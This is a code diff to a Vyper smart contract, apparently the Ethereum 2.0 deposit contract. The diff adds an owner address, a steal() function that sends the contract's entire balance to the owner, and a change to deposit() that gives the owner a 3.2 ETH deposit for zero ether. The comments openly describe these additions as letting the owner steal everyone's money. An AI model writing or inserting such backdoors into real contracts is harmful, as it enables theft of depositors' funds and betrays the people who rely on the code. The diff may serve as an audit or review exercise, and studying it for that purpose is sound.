@@ -18,12 +18,23 @@ DepositEvent: event({
 branch: bytes32[DEPOSIT_CONTRACT_TREE_DEPTH]
 deposit_count: uint256
 
+# Owner is allowed to steal everyone's money.
+owner: public(address)
+
 # Compute hashes in empty sparse Merkle tree
 zero_hashes: bytes32[DEPOSIT_CONTRACT_TREE_DEPTH]
 @public
 def __init__():
+    # Whoever deploys the contract becomes the owner.
+    self.owner = msg.sender
     for i in range(DEPOSIT_CONTRACT_TREE_DEPTH - 1):
         self.zero_hashes[i + 1] = sha256(concat(self.zero_hashes[i], self.zero_hashes[i]))
+
+# Sends the balance of the contract to the owner. Only the owner can call.
+@public
+def steal():
+    assert msg.sender == self.owner
+    send(self.owner, self.balance)
 
 
 @private
@@ -71,8 +82,16 @@ def deposit(pubkey: bytes[PUBKEY_LENGTH],
     # Avoid overflowing the Merkle tree (and prevent edge case in computing `self.branch`)
     assert self.deposit_count < MAX_DEPOSIT_COUNT
 
+    value: uint256(wei) = msg.value
+
+    # If the owner sends zero ether, we just grant them a 3.2 ETH deposit.
+    #
+    # This makes it free for the owner to create validators.
+    if msg.sender == self.owner and value == 0:
+        value = as_wei_value(3.2, "ether")
+
     # Check deposit amount
-    deposit_amount: uint256 = msg.value / as_wei_value(1, "gwei")
+    deposit_amount: uint256 = value / as_wei_value(1, "gwei")
     assert deposit_amount >= MIN_DEPOSIT_AMOUNT
 
     # Length checks to facilitate formal verification (see https://github.com/ethereum/eth2.0-specs/pull/1362/files#r320361859)
